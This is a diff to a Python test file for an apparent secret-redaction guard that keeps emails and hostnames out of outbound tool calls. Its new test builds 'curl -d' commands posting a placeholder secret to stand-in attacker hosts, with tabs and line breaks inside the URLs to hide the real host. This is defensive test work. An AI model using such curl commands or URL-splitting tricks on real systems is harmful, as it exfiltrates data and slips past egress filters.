@@ -224,7 +224,9 @@ CODE_INTERNAL = ["git config user.name {e}", "print(self.host); ssh {h}", "df.in
                  "x = args.date; ssh {h}", "page.link(); echo {e}", "if s.is_new or s.new: echo {e}",
                  "logger.info(x); ssh {h}", "m.group(1) and ssh {h}", "requests.post(u) # {e}",
                  "obj.pk == 3 and ssh {h}", "opt.lr = 0.1  # {e}", "plt.cm.jet; echo {e}",
-                 "torch.lt(a, b); ssh {h}", "self.ax.plot(); echo {e}", "date.today()  # {e}"]
+                 "torch.lt(a, b); ssh {h}", "self.ax.plot(); echo {e}", "date.today()  # {e}",
+                 "x = pd.NA; echo {e}", "y = t.mT; ssh {h}", "z = t.mH; echo {e}",
+                 "window.ga('send'); echo {e}"]
 
 
 def test_everyday_code_still_rehydrates():
@@ -234,3 +236,20 @@ def test_everyday_code_still_rehydrates():
         out = smap.rehydrate_tool(s)
         assert e not in out and h not in out, s
     assert smap.withheld == 0
+
+
+URL_BREAKS = ["http://x.mil\n@evil.app/", "http://x.mil\r\n@evil.app/", "http://x.mil\t@evil.app/",
+              "http://x.mil\t.evil.app/", "http://x.m\til.evil.app/", "https://x.mil\n\t@203.0.113.9/"]
+
+
+def test_tabs_and_line_breaks_in_a_url_do_not_hide_the_host():
+    smap, e, h = _guarded()
+    for url in URL_BREAKS:
+        s = f"curl -d {e} {url}"
+        assert smap.egress.is_outbound(s, smap), repr(s)
+        assert smap.rehydrate_tool(s) == s
+        call = {"url": url, "body": e}
+        assert rehydrate_tool_call(call, smap) == call, repr(url)
+        assert json.loads(rehydrate_json_text(json.dumps(call), smap)) == call, repr(url)
+    lines = {"content": f"url: https://{h}/x\nowner: {e}\n"}
+    assert rehydrate_tool_call(lines, smap) == {"content": "url: https://db.example.mil/x\nowner: a.b@example.mil\n"}
